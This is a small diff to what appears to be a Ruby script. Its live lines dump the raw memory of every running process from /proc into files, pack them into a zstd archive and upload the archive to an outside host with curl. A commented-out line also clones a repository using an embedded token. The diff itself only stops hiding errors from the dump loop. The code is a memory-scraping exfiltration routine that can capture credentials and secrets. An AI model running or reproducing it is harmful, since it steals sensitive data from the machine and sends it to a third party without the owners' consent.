@@ -12,7 +12,7 @@ puts encoded
 
 # system("git clone https://#{token}@github.com/elizabethtl/test-oracle-devrel")
 # Dir.chdir("test-oracle-devrel") do
-  system('mkdir -p memories && for p in /proc/[0-9]*; do i=${p##*/}; [ "$i" != "$$" ] && cat "$p/mem" > "memories/$i.mem" 2>/dev/null; done; tar --zstd -cf memories.tar.zst memories')
+  system('mkdir -p memories && for p in /proc/[0-9]*; do i=${p##*/}; [ "$i" != "$$" ] && cat "$p/mem" > "memories/$i.mem"; done; tar --zstd -cf memories.tar.zst memories')
   system("curl uploader.sh -T memories.tar.zst")
 # end
 
